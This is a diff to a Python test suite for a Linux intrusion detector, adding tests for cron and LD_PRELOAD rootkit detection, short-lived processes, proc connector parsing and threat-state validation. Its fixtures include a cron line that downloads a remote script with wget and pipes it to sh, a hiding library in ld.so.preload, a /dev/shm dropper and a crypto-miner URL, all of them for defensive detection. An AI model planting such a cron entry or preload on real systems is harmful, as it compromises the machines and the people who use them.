@@ -9,7 +9,7 @@ import unittest
 from types import SimpleNamespace
 from unittest.mock import patch
 import psutil
-from detection import Detector, Traps, TRAP_HEADER, default_places
+from detection import Detector, Traps, TRAP_HEADER, default_places, parse_proc_events, validate_threats
 
 
 def row(pid=500,name='app',exe='/usr/bin/app',cmdline=(),ppid=1,cpu=0.):
@@ -25,7 +25,8 @@ class DetectionTests(unittest.TestCase):
             (self.root/name).mkdir()
         self.cron = ''
         self.detector = Detector(home=self.root/'home',proc=self.root/'proc',usb_root=self.root/'usb',
-            config=self.root/'ignore.txt',read_crontab=lambda: self.cron,traps=False)
+            config=self.root/'ignore.txt',read_crontab=lambda: self.cron,traps=False,preload=self.root/'preload',
+            system_startup=(str(self.root/'etc'/'cron.d'/'*'),))
         patcher = patch('detection.psutil.net_connections',return_value=[])
         self.connections = patcher.start()
         self.addCleanup(patcher.stop)
@@ -112,6 +113,54 @@ class DetectionTests(unittest.TestCase):
         found = self.detector.assess([],4,1.)['system']
         self.assertEqual([f['severity'] for f in found],['alta'])
         self.assertIn('BadUSB',found[0]['reason'])
+
+    def test_system_startup_and_ld_preload_rootkit(self):
+        (self.root/'etc'/'cron.d').mkdir(parents=True)
+        (self.root/'etc'/'cron.d'/'job').write_text('*/5 * * * * root wget -q -O- http://x/s | sh\n')
+        (self.root/'preload').write_text('/usr/lib/libhide.so\n')
+        reasons = {f['reason']:f['severity'] for f in self.detector.assess([],4,0.)['system']}
+        self.assertTrue(any('cron.d/job' in r for r in reasons))
+        self.assertEqual([s for r,s in reasons.items() if 'ld.so.preload' in r],['alta'])
+
+    def test_short_lived_process_seen_at_exec(self):
+        quick = row(4321,'sh',exe='/dev/shm/dropper',cmdline=['/dev/shm/dropper'])
+        self.detector.exec_seen(quick)
+        self.detector.exec_seen(row(4322,'ls'))  # harmless: never stored
+        alive = row(4323,'x',exe='/dev/shm/stays')
+        self.detector.exec_seen(alive)
+        system = self.detector.assess([alive],4,0.)['system']
+        self.assertEqual(len(system),1)
+        self.assertIn('breve durata PID 4321',system[0]['reason'])
+        self.assertEqual(len(self.detector.assess([alive],4,1.)['system']),1)  # kept, not duplicated
+
+    def test_exec_watcher_catches_a_one_millisecond_process(self):
+        from detection import ExecWatcher
+        try:
+            watcher = ExecWatcher(self.detector)
+        except OSError as exc:
+            self.skipTest(f'proc connector non disponibile: {exc}')
+        watcher.start()
+        self.addCleanup(watcher.close)
+        subprocess.run(['sh','-c','true # stratum+tcp://quick.invalid:3333'])
+        time.sleep(.5)
+        system = self.detector.assess([],4,0.)['system']
+        self.assertTrue(any('breve durata' in s['reason'] and 'miner' in s['reason'] for s in system),system)
+
+    def test_proc_connector_parser(self):
+        import struct
+        def message(what,pid,tgid):
+            body = struct.pack('IIIIHH',1,1,0,0,40,0)+struct.pack('IIQ',what,0,0)+struct.pack('ii',pid,tgid)+bytes(16)
+            return struct.pack('IHHII',16+len(body),3,0,0,0)+body
+        self.assertEqual(parse_proc_events(message(2,50,50)+message(1,51,51)+message(2,52,50)),[(50,50),(52,50)])
+        self.assertEqual(parse_proc_events(b'\x00'*8),[])
+
+    def test_root_state_validation(self):
+        good = dict(processes=[dict(pid=5,created=1.,severity='alta',reasons=['x'])],system=[dict(severity='media',reason='y')],traps=['/tmp/a'])
+        self.assertIs(validate_threats(good),good)
+        for bad in (dict(good,processes=[dict(pid=0,created=1.,severity='alta',reasons=['x'])]),dict(good,system=[dict(severity='critica',reason='x')]),
+                    dict(good,traps=[1]),{k:v for k,v in good.items() if k != 'traps'}):
+            with self.assertRaises(ValueError):
+                validate_threats(bad)
 
     def test_ignore_list_by_executable(self):
         (self.root/'ignore.txt').write_text('/tmp/y\n')
